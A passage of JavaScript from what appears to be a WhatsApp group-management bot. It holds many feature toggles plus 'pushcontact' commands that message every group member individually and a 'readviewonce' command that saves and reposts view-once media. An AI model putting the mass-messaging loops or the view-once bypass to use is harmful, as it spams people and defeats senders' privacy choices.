await ToxxicTechInc.sendMessage(xnxx, { text: text.split('|')[0], mentions: participanh.map(a => a.id) })
await sleep(text.split('|')[1])
}}
newReply(`Success`)
}
break
            case 'pushcontact': {
    if (!isCreator) return ownernya()
      if (!m.isGroup) return newReply(`The feature works only in grup`)
    if (!text) return newReply(`text?`)
    let mem = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
    newReply(`Success in pushing the message to contacts`)
    for (let pler of mem) {
    ToxxicTechInc.sendMessage(pler, { text: q})
     }  
     newReply(`Done`)
      }
      break
case "pushcontactv2":{
if (!isCreator) return ownernya()
if (!q) return newReply(`Incorrect Usage Please Use Command Like This\n${prefix+command} idgc|text`)
await hana()
const metadata2 = await ToxxicTechInc.groupMetadata(q.split("|")[0])
const halss = metadata2.participants
for (let mem of halss) {
ToxxicTechInc.sendMessage(`${mem.id.split('@')[0]}` + "@s.whatsapp.net", { text: q.split("|")[1] })
await sleep(5000)
}
newReply(`Success`)
}
break
case 'pushcontactv3':
if (!isCreator) return ownernya()
if (!isGroup) return LorenzoStickGroup()
if (!text) return newReply(
`
*Usage example :*

${prefix+command} pause|text

‼️Reply Image To Send Images to All Participants, For a pause, 1000 = 1 second
`
)
let jedany = text.split("|")[0]
let captny = text.split("|")[1]
const halsss = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let men of halsss) {
if (/image/.test(mime)) {
media = await ToxxicTechInc.downloadAndSaveMediaMessage(quoted)
mem = await TelegraPh(media)
await ToxxicTechInc.sendMessage(men, { image: { url: mem }, caption: captny }, { quoted: m })
await sleep(1000)
await ToxxicTechInc.sendMessage(men, { text: captny  }, { quoted: m })
await sleep(jedany)
} else {
await ToxxicTechInc.sendMessage(men, { text: captny  }, { quoted: m })
await sleep(jedany)
}
}
newReply(`Success`)
break
case 'block': case 'ban': {
		if (!isCreator) return ownernya()
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await ToxxicTechInc.updateBlockStatus(users, 'block')
		await newReply(`Mother Fucker Has being Blocked`)
	}
	break
	case 'unblock': case 'unban': {
		if (!isCreator) return ownernya()
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await ToxxicTechInc.updateBlockStatus(users, 'unblock')
		await newReply(`Okay Ill unblock the Mother Fucker`)
	}
	break
            case 'bcgc':
            case 'bcgroup': {
                if (!isCreator) return ownernya()
                if (!text) return newReply(`Text mana?\n\nExample : ${prefix + command} Besok Libur `)
                let getGroups = await ToxxicTechInc.groupFetchAllParticipating()
                let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
                let anu = groups.map(v => v.id)
                newReply(`Sending Broadcast To ${anu.length} Group Chat, End Time ${anu.length * 1.5} seconds`)
                for (let i of anu) {
                    await sleep(1500)
                    let a = `${ownername}'s Broadcast\n\n` + '```' + `Message: ${text}\n\n` + '```'
                    ToxxicTechInc.sendMessage(i, {
                        text: a,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: `Sent in ${i.length} Group`,
                                thumbnailUrl: 'https://i.ibb.co/hLdW1MR/IMG-20240906-154741-714.jpg',
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    })
                }
                newReply(`Successful in sending Broadcast To ${anu.length} Group`)
            }
            break
            case 'getcase':
                if (m.sender != '2348165846414@s.whatsapp.net') return newReply('This Command Is Only Available To Toxxic Boy The developer') 
                try {
                   const getCase = (cases) => {
                      return "case" + `'${cases}'` + fs.readFileSync("queenrias.js").toString().split('case \'' + cases + '\'')[1].split("break")[0] + "break"
                   }
                   newReply(`${getCase(q)}`)
                } catch {
                  newReply(`case ${q} not found!`)
                }
            break
            //group
            case 'antibadword':
            case 'antitoxic':{
		         if (!m.isGroup) return LorenzoStickGroup()
if (!isBotAdmins) return LorenzoStickBotAdmin()
if (!isAdmins && !isCreator) return LorenzoStickAdmin()
               
               if (args[0] === 'on') {
                  db.data.chats[from].badword = true
                  newReply(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].badword = false
                  newReply(`${commad} is disabled`)
               } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./File/theme/rias.jpg')}, { upload: ToxxicTechInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await ToxxicTechInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
               }
            break
            case 'react': {
                if (!isCreator) return ownernya()
                reactionMessage = {
                    react: {
                        text: args[0],
                        key: { remoteJid: m.chat, fromMe: true, id: quoted.id }
                    }
                }
                ToxxicTechInc.sendMessage(m.chat, reactionMessage)
            }
            break
           case 'nsfw': {
if (!m.isGroup) return LorenzoStickGroup()
if (!isBotAdmins) return LorenzoStickBotAdmin()
if (!isAdmins && !isCreator) return LorenzoStickAdmin()
if (args[0] === "on") {
if (AntiNsfw) return newReply('Already activated')
ntnsfw.push(from)
fs.writeFileSync('./src/data/function/nsfw.json', JSON.stringify(ntnsfw))
newReply('Success in turning on nsfw in this group')
var groupe = await ToxxicTechInc.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
ToxxicTechInc.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nNsfw(not safe for work) feature has been enabled in this group, which means one can access sexual graphics from the bot!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiNsfw) return newReply('Already deactivated')
let off = ntnsfw.indexOf(from)
ntnsfw.splice(off, 1)
fs.writeFileSync('./src/data/function/nsfw.json', JSON.stringify(ntnsfw))
newReply('Success in turning off nsfw in this group')
} else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./File/theme/rias.jpg')}, { upload: ToxxicTechInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await ToxxicTechInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
  }
  break
  case 'userjid':
  case 'jid':
  case 'groupjid':
            case 'id':{
            newReply(from)
           }
          break
            case 'antiaudio':{
            	if (!m.isGroup) return LorenzoStickGroup()
if (!isBotAdmins) return LorenzoStickBotAdmin()
if (!isAdmins && !isCreator) return LorenzoStickAdmin()
               
               if (args[0] === 'on') {
                  db.data.chats[from].antiaudio = true
                  newReply(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].antiaudio = false
                  newReply(`${command} is disabled`)
               } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./File/theme/rias.jpg')}, { upload: ToxxicTechInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await ToxxicTechInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
               }
            break
            case 'antiforeign':{
            	if (!m.isGroup) return LorenzoStickGroup()
if (!isBotAdmins) return LorenzoStickBotAdmin()
if (!isAdmins && !isCreator) return LorenzoStickAdmin()
               
               if (args[0] === 'on') {
                  db.data.chats[m.chat].antiforeignnum = true
                  newReply(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[m.chat].antiforeignnum = false
                  newReply(`${command} is disabled`)
               } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./File/theme/rias.jpg')}, { upload: ToxxicTechInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await ToxxicTechInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
               }
            break
            case 'poll': {
	if (!isCreator) return ownernya()
            let [poll, opt] = text.split("|")
            if (text.split("|") < 2)
                return await newReply(
                    `Mention question and atleast 2 options\nExample: ${prefix}poll Who is best admin?|ToxxicTechInc,Cheems,Doge...`
                )
            let options = []
            for (let i of opt.split(',')) {
                options.push(i)
            }
            await ToxxicTechInc.sendMessage(m.chat, {
                poll: {
                    name: poll,
                    values: options
                }
            })
        }
        break
            case 'antipoll':{
            	if (!m.isGroup) return LorenzoStickGroup()
if (!isBotAdmins) return LorenzoStickBotAdmin()
if (!isAdmins && !isCreator) return LorenzoStickAdmin()
               
               if (args[0] === 'on') {
                  db.data.chats[from].antipoll = true
                  newReply(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].antipoll = false
                  newReply(`${command} is disabled`)
               } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./File/theme/rias.jpg')}, { upload: ToxxicTechInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await ToxxicTechInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
               }
            break
            case 'antisticker':{
            	if (!m.isGroup) return LorenzoStickGroup()
if (!isBotAdmins) return LorenzoStickBotAdmin()
if (!isAdmins && !isCreator) return LorenzoStickAdmin()
               
               if (args[0] === 'on') {
                  db.data.chats[from].antisticker = true
                  newReply(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].antisticker = false
                  newReply(`${command} is disabled`)
               } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./File/theme/rias.jpg')}, { upload: ToxxicTechInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await ToxxicTechInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
               }
            break
            case 'antiimage':{
            	if (!m.isGroup) return LorenzoStickGroup()
if (!isBotAdmins) return LorenzoStickBotAdmin()
if (!isAdmins && !isCreator) return LorenzoStickAdmin()
               
               if (args[0] === 'on') {
                  db.data.chats[from].antiimage = true
                  newReply(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].antiimage = false
                  newReply(`${command} is disabled`)
               } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./File/theme/rias.jpg')}, { upload: ToxxicTechInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await ToxxicTechInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
               }
            break
            case 'antivideo':{
            	if (!m.isGroup) return LorenzoStickGroup()
if (!isBotAdmins) return LorenzoStickBotAdmin()
if (!isAdmins && !isCreator) return LorenzoStickAdmin()
               
               if (args[0] === 'on') {
                  db.data.chats[from].antivideo = true
                  newReply(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].antivideo = false
                  newReply(`${command} is disabled`)
               } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./File/theme/rias.jpg')}, { upload: ToxxicTechInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await ToxxicTechInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
               }
            break
            case 'antivirtex':{
		         if (!m.isGroup) return LorenzoStickGroup()
if (!isBotAdmins) return LorenzoStickBotAdmin()
if (!isAdmins && !isCreator) return LorenzoStickAdmin()
               
               if (args[0] === 'on') {
                  db.data.chats[from].antivirtex = true
                  newReply(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].antivirtex = false
                  newReply(`${command} is disabled`)
               } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./File/theme/rias.jpg')}, { upload: ToxxicTechInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await ToxxicTechInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
               }
            break
            case 'antibot':{
		         if (!m.isGroup) return LorenzoStickGroup()
if (!isBotAdmins) return LorenzoStickBotAdmin()
if (!isAdmins && !isCreator) return LorenzoStickAdmin()
               
               if (args[0] === 'on') {
                  db.data.chats[from].antibot = true
                  newReply(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].antibot = false
                  newReply(`${command} is disabled`)
               } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./File/theme/rias.jpg')}, { upload: ToxxicTechInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await ToxxicTechInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
               }
            break
            case 'readviewonce': case 'vv': {
	if (!m.quoted) return newReply(`Reply to view once message`)
	if (m.quoted.mtype !== 'viewOnceMessageV2') return newReply(`This is not a view once message`)
    let msg = m.quoted.message
    let type = Object.keys(msg)[0]
    let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : 'video')
    let buffer = Buffer.from([])
    for await (const chunk of media) {
        buffer = Buffer.concat([buffer, chunk])
    }
    if (/video/.test(type)) {
        return ToxxicTechInc.sendFile(m.chat, buffer, 'media.mp4', msg[type].caption || '', m)
    } else if (/image/.test(type)) {
        return ToxxicTechInc.sendFile(m.chat, buffer, 'media.jpg', msg[type].caption || '', m)
    }
}
break
            case 'antivv':{
if (!isCreator) return ownernya()
               
               if (args[0] === 'on') {
                  db.data.chats[from].antiviewonce = true
                  newReply(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].antiviewonce = false
                  newReply(`${command} is disabled`)
               } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./File/theme/rias.jpg')}, { upload: ToxxicTechInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await ToxxicTechInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
               }
            break
            case 'antispam':{
		         if (!m.isGroup) return LorenzoStickGroup()
if (!isBotAdmins) return LorenzoStickBotAdmin()
if (!isAdmins && !isCreator) return LorenzoStickAdmin()
               
               if (args[0] === 'on') {
                  db.data.chats[from].antispam = true
                  newReply(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].antispam = false
                  newReply(`${command} is disabled`)
               } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./File/theme/rias.jpg')}, { upload: ToxxicTechInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
